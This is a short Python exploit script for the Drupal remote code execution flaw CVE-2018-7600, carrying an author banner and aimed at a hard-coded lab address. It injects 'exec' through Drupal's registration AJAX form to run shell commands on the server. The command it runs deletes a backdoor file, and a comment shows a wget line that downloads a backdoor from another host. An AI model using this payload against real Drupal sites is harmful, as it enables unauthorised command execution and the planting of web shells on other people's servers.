#!/usr/bin/python2.7
'''_____________________________________________________________________
|[] R3DXPL0IT SHELL                                            |ROOT]|!"|
|"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""|"| 
|CODED BY > R3DXPLOIT(JIMMY)                                          | |
|EMAIL > RETURN_ROOT@PROTONMAIL.COM                                   | |
|GITHUB > https://github.com/r3dxpl0it                                | |
|WEB-PAGE > https://r3dxpl0it.Github.io                               |_|
|_____________________________________________________________________|/|
'''
'''
https://nvd.nist.gov/vuln/detail/CVE-2018-7600#
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600
'''
import sys
import requests

def exploit(target):
    pass
    proxies = {}
    verify = False

    payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'rm -rf backdoor.php'} # rm -rf backdoor.php
    url = target + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'  #wget -O backdoor.php http://192.168.223.137/backdoor.txt
    print ( '[*]' + ' requesting post')
    r = requests.post(url, proxies=proxies, data=payload, verify=verify)
    # try:
    #     scan = requests.get(target + 'vulnerable.txt')cd
    #     if scan.status_code != 200:
    #        print ( ' not vulnerable to cve-2018-7600 exploit \n')
    #     if scan.status_code == 200:
    #        print (' vulnerable to cve-2018-7600 exploit')
    #        print (' url: ' + target + 'vulnerable.txt \n')
    # except requests.ConnectionError:
    #     print (' target connection timeout')
    # except Exception as e :
    #     print ('Connction Failed ' + e )
				#

if __name__ == '__main__':
   
   exploit('http://192.168.223.136/drupal')